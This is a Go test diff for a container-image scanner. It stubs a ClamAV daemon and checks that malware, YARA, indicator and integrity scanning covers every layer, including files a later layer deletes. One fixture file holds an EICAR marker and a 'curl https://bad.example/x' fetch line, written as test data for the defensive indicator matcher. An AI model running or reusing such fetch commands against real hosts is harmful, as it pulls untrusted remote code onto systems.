@@ -1,9 +1,14 @@
 package scanner
 
 import (
+	"archive/tar"
+	"bufio"
 	"bytes"
 	"context"
+	"encoding/binary"
 	"encoding/json"
+	"io"
+	"net"
 	"os"
 	"path/filepath"
 	"strings"
@@ -12,6 +17,9 @@ import (
 
 	"github.com/ORIBData/scrstack/internal/connections"
 	"github.com/google/go-containerregistry/pkg/name"
+	v1 "github.com/google/go-containerregistry/pkg/v1"
+	"github.com/google/go-containerregistry/pkg/v1/empty"
+	"github.com/google/go-containerregistry/pkg/v1/mutate"
 	"github.com/google/go-containerregistry/pkg/v1/remote"
 	"github.com/google/go-containerregistry/pkg/v1/tarball"
 )
@@ -75,7 +83,8 @@ func TestLiveImageArchiveAndScan(t *testing.T) {
 	if err := os.WriteFile(path, archive.Bytes(), 0600); err != nil {
 		t.Fatal(err)
 	}
-	out, err := Engine{Binary: binary, WorkRoot: work, Database: db}.RunImage(ctx, path)
+	clamd := os.Getenv("SCRS_TEST_CLAMD_ADDRESS")
+	out, err := Engine{Binary: binary, WorkRoot: work, Database: db, ClamdAddress: clamd}.RunImage(ctx, path)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -83,8 +92,36 @@ func TestLiveImageArchiveAndScan(t *testing.T) {
 	for _, s := range out.Stages {
 		stages[s.Name] = s.Status
 	}
-	if stages["inventory"] != "ok" || stages["malware"] != "skipped" || len(out.Components) < 10 || len(out.Findings) == 0 || !json.Valid(out.SBOM) {
-		t.Fatal("image inventory incomplete", stages, len(out.Components), len(out.Findings))
+	// Without a live ClamAV, malware is skipped. With one, every layer file is
+	// scanned and the SCRS YARA ruleset is proven loaded (canary).
+	wantMalware, wantYARA := "skipped", "skipped"
+	if clamd != "" {
+		wantMalware, wantYARA = "ok", "ok"
+		// The test ClamAV runs without freshclam; stale signatures must show
+		// as partial coverage with the posture finding, never as ok.
+		for _, f := range out.Findings {
+			if f.AdvisoryID == "SCRS-CLAMAV-SIGNATURE-AGE" {
+				wantMalware = "partial"
+			}
+		}
+		for _, file := range out.Files {
+			if file.Malware == "error" {
+				t.Fatal("ClamAV failed on a layer file", file)
+			}
+		}
+	}
+	if stages["inventory"] != "ok" || stages["malware"] != wantMalware || stages["yara"] != wantYARA || stages["integrity"] != "ok" || len(out.Components) < 10 || len(out.Findings) == 0 || !json.Valid(out.SBOM) {
+		t.Fatal("image assessment incomplete", out.Stages, len(out.Components), len(out.Findings))
+	}
+	for _, f := range out.Findings {
+		if f.Type == "malware" {
+			t.Fatal("clean Alpine image flagged as malware", f)
+		}
+	}
+	for _, s := range out.Stages {
+		if s.Name == "malware" {
+			t.Log("layer coverage:", s.Detail)
+		}
 	}
 	for _, c := range out.Components {
 		if strings.HasPrefix(c.Path, "/") || strings.Contains(c.Path, "..") || !strings.HasPrefix(c.PURL, "pkg:apk/") {
@@ -95,4 +132,121 @@ func TestLiveImageArchiveAndScan(t *testing.T) {
 		t.Fatal("SBOM leaked scanner work path")
 	}
 	t.Logf("image %s: %d packages, %d findings", digest, len(out.Components), len(out.Findings))
+}
+
+// contentClamd answers zVERSION with today's signatures and INSTREAM by
+// content: the YARA canary, an EICAR marker, or clean.
+func contentClamd(t *testing.T) string {
+	t.Helper()
+	listener, err := net.Listen("tcp", "127.0.0.1:0")
+	if err != nil {
+		t.Fatal(err)
+	}
+	t.Cleanup(func() { _ = listener.Close() })
+	go func() {
+		for {
+			c, err := listener.Accept()
+			if err != nil {
+				return
+			}
+			go func() {
+				defer c.Close()
+				r := bufio.NewReader(c)
+				command, err := r.ReadString(0)
+				if err != nil {
+					return
+				}
+				if command == "zVERSION\x00" {
+					_, _ = io.WriteString(c, "ClamAV 1.4.3/27500/"+time.Now().UTC().Format("Mon Jan _2 15:04:05 2006")+"\x00")
+					return
+				}
+				var body bytes.Buffer
+				for {
+					var n uint32
+					if binary.Read(r, binary.BigEndian, &n) != nil {
+						return
+					}
+					if n == 0 {
+						break
+					}
+					if _, err := io.CopyN(&body, r, int64(n)); err != nil {
+						return
+					}
+				}
+				reply := "stream: OK"
+				switch {
+				case strings.Contains(body.String(), yaraCanary):
+					reply = "stream: YARA.SCRS_Canary.UNOFFICIAL FOUND"
+				case strings.Contains(body.String(), "EICAR-STANDARD"):
+					reply = "stream: Eicar-Signature FOUND"
+				}
+				_, _ = io.WriteString(c, reply+"\x00")
+			}()
+		}
+	}()
+	return listener.Addr().String()
+}
+
+func layerOf(t *testing.T, files map[string]string) v1.Layer {
+	t.Helper()
+	var buf bytes.Buffer
+	w := tar.NewWriter(&buf)
+	for name, body := range files {
+		if err := w.WriteHeader(&tar.Header{Name: name, Mode: 0644, Size: int64(len(body)), Typeflag: tar.TypeReg}); err != nil {
+			t.Fatal(err)
+		}
+		_, _ = io.WriteString(w, body)
+	}
+	_ = w.Close()
+	data := buf.Bytes()
+	layer, err := tarball.LayerFromOpener(func() (io.ReadCloser, error) { return io.NopCloser(bytes.NewReader(data)), nil })
+	if err != nil {
+		t.Fatal(err)
+	}
+	return layer
+}
+
+// Layer malware, YARA and IOC coverage (M6): a file deleted by a later layer
+// is still inspected, because every pull still downloads it.
+func TestImageLayerContentScan(t *testing.T) {
+	image, err := mutate.AppendLayers(empty.Image,
+		layerOf(t, map[string]string{"app/payload.sh": "#!/bin/sh\n# EICAR-STANDARD fixture\ncurl https://bad.example/x\n", "usr/bin/tool": "clean binary"}),
+		layerOf(t, map[string]string{"app/.wh.payload.sh": "", "etc/motd": "welcome"}))
+	if err != nil {
+		t.Fatal(err)
+	}
+	work := t.TempDir()
+	archive := filepath.Join(work, "image.tar")
+	ref, _ := name.NewTag("registry.example/app:scrs")
+	if err := tarball.WriteToFile(archive, ref, image); err != nil {
+		t.Fatal(err)
+	}
+	bundle := IndicatorBundle{Version: "v1", Indicators: []Indicator{{ID: "IOC-BAD", Type: "domain", Value: "bad.example", ValidUntil: time.Now().Add(time.Hour)}}}
+	e := Engine{ClamdAddress: contentClamd(t), Indicators: &bundle}
+	files, findings, stages := e.scanLayers(context.Background(), archive)
+	status := map[string]string{}
+	for _, s := range stages {
+		status[s.Name] = s.Status
+	}
+	if status["malware"] != "ok" || status["yara"] != "ok" || status["ioc"] != "ok" || status["integrity"] != "ok" {
+		t.Fatal("layer stages incomplete", stages)
+	}
+	ids := map[string]bool{}
+	for _, f := range findings {
+		ids[f.Type+"/"+f.AdvisoryID+"/"+f.Component.Path] = true
+	}
+	if !ids["malware/Eicar-Signature/app/payload.sh"] || !ids["ioc_match/IOC-BAD/app/payload.sh"] || len(findings) != 2 {
+		t.Fatal("whited-out layer file not inspected", ids)
+	}
+	if len(files) != 1 || files[0].Path != "app/payload.sh" || files[0].Malware != "infected" {
+		t.Fatal("evidence should list only flagged files", files)
+	}
+	// An unreadable archive must never read as complete coverage.
+	_ = os.WriteFile(archive, []byte("not a tar"), 0600)
+	_, _, stages = e.scanLayers(context.Background(), archive)
+	for _, s := range stages {
+		if s.Name != "yara" && s.Status == "ok" {
+			t.Fatal("broken archive reported ok", s)
+		}
+	}
 }
